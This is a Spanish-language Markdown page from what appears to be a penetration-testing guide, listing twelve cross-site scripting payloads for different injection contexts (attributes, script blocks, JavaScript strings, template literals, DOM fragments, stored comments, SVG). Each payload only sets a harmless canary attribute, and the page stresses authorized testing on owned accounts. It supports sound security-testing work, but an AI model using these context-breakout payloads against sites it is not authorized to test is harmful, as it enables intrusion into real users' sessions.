# 🗡️ Cross-Site Scripting (XSS): payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

## 🔬 Pruebas por escenario

### 1. HTML entre etiquetas

**Objetivo:** Usar solo cuando el valor cae como texto HTML sin escape.

```html
<img src=x onerror="document.body.dataset.xss='prueba-123'">
```

**Interpretación:** Confirmar que aparece el atributo en el DOM de la página; un reflejo textual o un recurso roto no confirma ejecución.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/cross-site-scripting/contexts).

### 2. Atributo entre comillas dobles

**Objetivo:** Cerrar un atributo HTML vulnerable y crear un handler de prueba.

```html
" autofocus onfocus="document.body.dataset.xss='prueba-123'" x="
```

**Interpretación:** Solo aplica a un atributo entre comillas. Comprobar el elemento final y si el foco realmente dispara el handler.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/cross-site-scripting/contexts).

### 3. URL de href

**Objetivo:** Verificar un sink URL que acepte javascript: en un enlace propio.

```html
javascript:document.body.dataset.xss='prueba-123'
```

**Interpretación:** Exige clic del auditor; comparar URL resuelta y política CSP. No equivale a ejecución automática.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/cross-site-scripting/contexts).

### 4. Cierre de script

**Objetivo:** Aplicar si el dato está dentro de un elemento script y se parsea primero como HTML.

```html
</script><img src=x onerror="document.body.dataset.xss='prueba-123'">
```

**Interpretación:** Verificar que se creó un nuevo elemento y ejecutó el handler; no usarlo si el contexto es JSON separado.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/cross-site-scripting/contexts).

### 5. Cadena JavaScript

**Objetivo:** Salir de una cadena con comillas simples y reparar la sintaxis posterior.

```js
';document.body.dataset.xss='prueba-123';//
```

**Interpretación:** Adaptar a comilla y contexto exactos; un SyntaxError sin ejecución no confirma XSS.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/cross-site-scripting/contexts).

### 6. Template literal

**Objetivo:** Usar cuando la entrada cae dentro de backticks en JavaScript.

```js
${document.body.dataset.xss='prueba-123'}
```

**Interpretación:** La expresión se evalúa dentro del template literal; confirmar en DOM y evitar inferirlo del reflejo.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/cross-site-scripting/contexts).

### 7. Fragmento DOM

**Objetivo:** Usar si la SPA copia location.hash a innerHTML u otro sink HTML.

```text
#<img src=x onerror="document.body.dataset.xss='prueba-123'">
```

**Interpretación:** Abrir la URL con fragmento en una sesión de prueba; comprobar fuente y sink en DevTools.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/cross-site-scripting/dom-based).

### 8. Contenido almacenado

**Objetivo:** Enviar el canary a un campo propio que se renderice en otra vista.

```json
{"comment":"<img src=x onerror=\"document.body.dataset.xss='prueba-123'\">"}
```

**Interpretación:** Recargar con una segunda cuenta controlada; confirmar persistencia y ejecución sin exponer a usuarios reales.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/cross-site-scripting/contexts).

### 9. SVG con onload

**Objetivo:** Probar un contexto que permite SVG inline, no una imagen SVG aislada.

```html
<svg onload="document.body.dataset.xss='prueba-123'"></svg>
```

**Interpretación:** El handler debe ejecutarse bajo el origen objetivo; políticas CSP pueden bloquearlo.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/cross-site-scripting/contexts).

### 10. Atributo sin comillas

**Objetivo:** Probar un sink HTML cuyo valor de atributo no está delimitado.

```html
x onpointerenter=document.body.dataset.xss='prueba-123' x
```

**Interpretación:** Requiere interacción del puntero y que el parser genere un atributo nuevo; inspeccionar DOM final.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/cross-site-scripting/contexts).

### 11. Entidad HTML en handler

**Objetivo:** Probar decodificación de entidad antes de evaluar JavaScript en un atributo de evento.

```html
&apos;;document.body.dataset.xss='prueba-123';//
```

**Interpretación:** Solo aplica a una cadena JS dentro de un atributo HTML como onclick; el navegador decodifica la entidad antes del parser JS.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/cross-site-scripting/contexts).

### 12. Backslash antes de comilla

**Objetivo:** Comprobar escape incompleto de backslash en una cadena JavaScript.

```js
\';document.body.dataset.xss='prueba-123';//
```

**Interpretación:** El servidor debe escapar comillas pero no barras inversas para que la barra aportada neutralice su escape; verificar código final.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/cross-site-scripting/contexts).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
